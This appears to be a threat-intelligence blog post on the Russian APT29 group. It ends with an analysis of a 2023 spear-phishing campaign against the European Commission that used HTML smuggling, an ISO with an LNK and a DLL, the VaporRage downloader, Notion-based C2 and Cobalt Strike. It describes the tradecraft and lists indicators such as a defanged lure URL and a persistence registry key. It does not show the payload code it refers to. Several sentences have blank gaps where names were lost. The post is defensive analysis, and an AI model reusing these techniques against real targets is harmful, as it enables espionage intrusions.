A map of Russia, as imagined by DALL·E

APT29 is a highly sophisticated Advanced Persistent Threat (APT) group that has been
attributed to Russia’s Foreign Intelligence Service (SVR). The group has been active
since at least 2008 and has been involved in a wide range of espionage and cyber-attack
campaigns targeting governments, military organizations, defense contractors, and
various industries in the United States, Europe, and Asia.
APT29 is also known as NOBELIUM (Microsoft), Cozy Bear (Crowdstrike), The Dukes
(Kaspersky), JACKMACKEREL (iDefense), BlueBravo (Recorded Future) and UNC2452
(FireEye).
The group is known for its subtle and sophisticated tradecraft in stealing geopolitical
intelligence: unlike other Russian state-sponsored groups such as APT28 or Sandworm,
APT29 has not been linked to destructive operations and operates with much more
discretion.
The group has been attributed to a number of high-profile cyberattacks, including:
APT29 was one of the two Russian groups responsible for the cyberattack on the DNC
during the 2016 U.S. presidential election. The group gained access to the DNC’s
email system and stole sensitive information, which was subsequently leaked to the
public.
APT29 was attributed to the highly sophisticated supply chain attack against
SolarWinds, a leading IT management software provider. The attack allowed the group
to gain access to the systems of several U.S. government agencies, including the
Department of Justice, the Department of State, and the Department of Homeland
Security.
In May 2021, it was revealed that APT29 was responsible for a large-scale cyberattack on
multiple U.S. government agencies and private companies, including Microsoft. The group
used a compromised email marketing system to send spear-phishing emails to over 3,000
individual accounts, resulting in the installation of a backdoor that allowed the attackers to

gain access to the victims’ networks. The group has also been linked to other significant
cyberattacks, including the theft of COVID-19 research from U.S.-based pharmaceutical
companies.
Overall, APT29 is one of the most sophisticated and well-resourced APT groups in the world,
and its TTPs are constantly evolving and changing.

Tactics, Techniques, and Procedures
APT29 is known for its patient and persistent targeting of its victims, often using multi-stage
attacks that take weeks or even months to complete. Following is a list of the group’s most
notable TTPs:
the group uses highly targeted and convincing spear-phishing emails to gain access to
a target’s system. These emails are usually tailored to the recipient’s interests and
appear to come from a trusted source.
APT29 has also been known to use watering hole attacks, where the group
compromises a trusted website frequented by the target, and then injects malware into
the site to infect visitors.
APT29 uses highly customized malware, such as “SeaDuke” and “CosmicDuke,” that
are designed to evade detection and maintain persistence on the target system. The
group is also known to use well-known tools like “Cobalt Strike” and “PowerShell
Empire”.
the group is known for its use of zero-day exploits to gain access to target systems. For
example, APT29 has been known to use exploits for popular software like Microsoft
Office and Adobe Flash.
APT29 often uses “” tactics, where the group uses legitimate tools and techniques that
are already present on the target system to evade detection. This can include tools like
, , and .
In this particular research, I focused on analyzing APT29’s command-and-control
capabilities.

Command & Control
This threat group has a history of using trusted and legitimate cloud services (such as
social media services and Google Drive) for their cyber attacks in an attempt to blend into
normal network traffic and evade detection. Malware distributed by APT29 also contains
the ability to exfiltrate data over those same C2 channels. For example:
The group’s malware searched for specific that contained URLs to access C2 servers.
APT29’s and malware also have the ability to use to obtain C2 URLs, as well as other
social media services like and

APT29’s backdoor uses , , and for C2 communication.
APT29 has also utilized custom encryption methods, such as those found in the group’s
SeaDuke malware where a unique fingerprint was generated for the infected host and
Base64 encoding and RC4/AES encryption was used to layer data during communications
with their C2 server. The group has also employed techniques such as “domain fronting” and
TOR obfuscation plugins to create encrypted network tunnels.
Using social networks for C2 communications is not an entirely new technique: other
Russian groups such as Turla (Venomous Bear) leveraged comments posted to Instagram
to obtain the address of its command and control servers.

APT29 was spotted using Twitter to control infected machines as early as 2015: in the
HAMMERTOSS campaign, the group was able to receive commands and send stolen data
through the popular social network, which allowed them to evade detection by security
solutions that did not monitor social media traffic.

EnvyScout
In a more recent campaign dating back to June 2021, APT29 targeted Italy diplomatic
organizations with a spear phishing campaign that distributed the EnvyScout backdoor.
C2 communication through Slack
The backdoor first calls a function to create a custom Slack channel, adding the attacker’s
user ID to the newly created channel. The backdoor gets the user name and hostname of the
victim host, adds 4 random numbers to form the name of the channel, and sends an HTTP
request with an authorization token to the Slack API. After the channel is established, the
backdoor enters an infinite loop: it uses the “chat.postMessage” API request to send a
beacon message to the newly created channel and it receives a response with a list of
additional files and payloads that are downloaded and executed on the target machine.

Beatdrop
In mid-January 2022, APT29 launched yet another spear phishing campaign targeting a
diplomatic entity, which was detected and responded to by Mandiant. During the
investigation, Mandiant discovered that the malicious emails were used to distribute the
BEATDROP and BOOMMIC downloaders.
BEATDROP is a downloader written in C that leverages Trello for Command-and-Control
(C2) communication. Trello is a web-based project management application that allows
users to organize tasks and projects using customizable boards, lists, and cards.

4/9

When executed, BEATDROP maps its own copy of ntdll.dll into memory to execute
shellcode in its own process. It creates a suspended thread, then enumerates the system for
the username, computer name, and IP address to create a victim ID. This victim ID is used
by BEATDROP to store and retrieve victim payloads from its C2. Once the victim ID is
created, BEATDROP sends an initial request to Trello to determine if the current victim has
already been compromised. The shellcode payload is then retrieved from Trello and is
targeted for each victim. Once the payload has been retrieved, it is deleted from Trello.

Notion for C2 Communication
In October 2022, ESET Research discovered a sample uploaded to VirusTotal that closely
resembled what APT29 had used a few months ago, with the key difference being that it
used Notion, a cloud-based note-taking software platform, for Command-and-Control
(C&C) communications.
Notion API can be abused for C2 communications by embedding the commands into the
Notion workspace, which is accessed by the malware as if it were a legitimate user. This
misuse of Notion allows the threat actors to evade detection and bypass security
controls, as the traffic between the malware and the Notion server is likely to be perceived
as legitimate traffic.
ESET researchers suspect that the downloader deployed in this particular campaign was
designed to gather and execute additional malicious payloads, such as Cobalt Strike. The
campaign has been analyzed in more detail by researchers at Hive Pro and Recorded
Future, which identify the sample as the GraphicalNeutrino malware.
According to Recorded Future, APT29 utilized a compromised website with a lure text of
“Ambassador’s schedule November 2022” to distribute the ZIP file “schedule.zip”, suggesting
that the targets of the campaign are related to embassy staff or an ambassador.
GraphicalNeutrino, the malware used in the operation, serves as a loader with basic C2
capabilities and employs various anti-analysis techniques to avoid detection, including API
unhooking and sandbox evasion.
GraphicalNeutrino artifact — 140runtime.dll
After establishing persistence, the malware decrypts several strings, including a Notion API
key and a database identifier, and calculates a unique ID for the victim based on their
username and hostname. It then uses Notion’s API for C2 communication to deliver
additional payloads to the victim’s machine.
For each request to the C2, GraphicalNeutrino parses the JSON-formatted response and
searches for a “file” array; if the array is not empty, then the malware will parse out the URL
field, download the file and decrypt it using a custom cipher. Once the shellcode is
decrypted, it is indirectly spawned in a new thread.

A sample response from Notion C2
The use of diplomatic lures during times of heightened geopolitical tensions, such as the
ongoing war in Ukraine, is likely to be effective for Russian APT groups, given the potential
impact of information gathered from compromised entities or individuals on Russian
foreign policy and strategic decision-making processes. It is perhaps for this reason that
APT29 adopted the same tactics — in particular the stealthy C2 communication through
Notion — for its next big campaign, this time targeting the European Commission.

Attack against the European Commission
In this final section of the blog post, I’m dissecting a previously undisclosed campaign
attributed to APT29 which targeted the European Commission. The previous introduction to
the group’s TTPs and campaigns will hopefully be beneficial to the reader, as this attack
shares quite a few similarities with the GraphicalNeutrino campaign that was exposed by
Recorded Future.

Initial Access
Beginning mid-February 2023, a spear phishing campaign targeted a number of email
addresses related to members of the European Commission. The attack involved the
distribution of a malicious .iso image that contained a new sample of the VaporRage
downloader. Once executed, the malware was observed exploiting the Notion API to deploy
Cobalt Strike beacons.
Execution flow for the attack targeting the European Commission
The first phishing email, sent on the 13th February 2023, masqueraded as an administrative
notice related to documents available to download from eTrustEx, a web based exchange
platform that ensures secure transmission of documents between members of the
Commission. The decoy emails are written in English and were delivered to an extremely
targeted number of key people that use the eTrustEx platform.
Lure email delivered to the European Commission
In addition, I noticed that in different samples of the email, the senders are probably
compromised email accounts belonging to legitimate government organizations. This could
lead victims to believe that the emails came from reliable partners, making it more likely for
recipients to click on the links.
When the link is opened, the victim is redirected to a malicious HTML page hosted at
hxxps://literaturaelsalvador[.]com/Instructions.html which makes use of a
technique known as HTML Smuggling to download an ISO image to the target system. I
believe that this domain is not actor-owned but has been compromised, which aligns with
previous APT29 activity.

6/9

Lure website
The ISO file is set to auto-download when the website is visited by the victim; this is
achieved through the following JavaScript code. The contents of Instructions.iso is stored
in the d variable.
JS Code which downloads the first-stage payload

Execution
Once the file has been written to disk, when a user double-clicks on it in Windows 10 or later,
the image is mounted and the folder contents is displayed in Windows Explorer. The ISO
contains two files — a Windows shortcut file (Instructions.lnk) and a malicious DLL
(BugSplatRc64.dll).
If the user clicks on the LNK file, the following command runs, unintentionally triggering the
execution of the malicious DLL.
Execution of the malicious DLL
Using LNK shortcuts to execute malicious DLLs is a technique that has been associated to
APT29 in a number of campaigns. In this particular scenario, I recognized the sample as
VaporRage, a downloader that has been used by APT29 since 2021.

Persistence
When executed with the InitiateDs export, VaporRage first runs a few reconnaissance
commands and generates a host-id by hex-encoding the DNS domain and username. Then,
it creates a copy of itself at:
C:\Users\%USERNAME%\AppData\Local\DsDiBacks\BugSplatRc64.dll

VaporRage creates a copy of itself
VaporRage then establishes persistence on the compromised system by creating a registry
run key located at: \Software\Microsoft\Windows\CurrentVersion\Run\DsDiBacks.

Command and Control
As I anticipated at the start of this post, the VaporRage sample delivered in the execution
chain leverages its command-and-control by communicating over HTTPS using Notion
APIs. Notion’s database feature is also used to store victim information and stage further
payloads for download.

7/9

Based on my observations, this VaporRage sample periodically executes a POST request to
the Notion API to check the availability of a second-stage malware payload, which is then
retrieved and executed in memory. In this particular campaign, APT29 used VaporRage to
distribute Cobalt Strike beacons to further establish a foothold within the environment.
Following is a sample POST request towards api.notion.com (104[.]18.42.99):

This technique exemplifies APT29’s ongoing attempts to obscure its actions and maintain
continuous access to target systems. This has been documented thoroughly by Mandiant,
who have described APT29 using a variety of techniques, including scheduled tasks, run
keys, malicious certificates, and in-memory backdoors, sometimes utilizing multiple
methods for each target.
Overall, the use of cloud services such as Trello and Notion for C2 communications not
only provides a threat actor with increased capabilities for evasion of network security
controls, but also increases resilience to law enforcement takedowns: social media and cloud
services are often hosted on multiple servers and locations, making it more difficult for
authorities to take down the entire platform. This means that the threat actor can continue to
use the platform for C2 communications even if some servers are taken down. These
advantages make it an attractive option for threat groups such as APT29 to conduct their
malicious activities.

Conclusions
The range of tactics, techniques, and procedures (TTPs) used by APT29 in this campaign
supports the conclusion that their objective is to establish numerous means of long-term
access to facilitate espionage-related intelligence gathering within the targeted
government entities’ victim networks. Nations that have a connection to the Ukraine crisis,
specifically those with significant geopolitical, economic, or military ties to Russia or Ukraine,
face a heightened risk of being targeted by APT29.

8/9

This threat group has shown an impressive ability to adapt swiftly during their operations.
They use innovative and unique methods to circumvent detection and authentication
requirements in their target environments. In their recent operations, the group has
demonstrated a deep understanding of operational security, enabling them to move
seamlessly between on-premises and cloud resources with minimal use of malware. These
factors, combined with their advanced malware development skills, long history of
operations, and extended time on targets, indicate that APT29 is a well-funded and
exceptionally sophisticated actor and will definitely continue to be a threat during 2023.
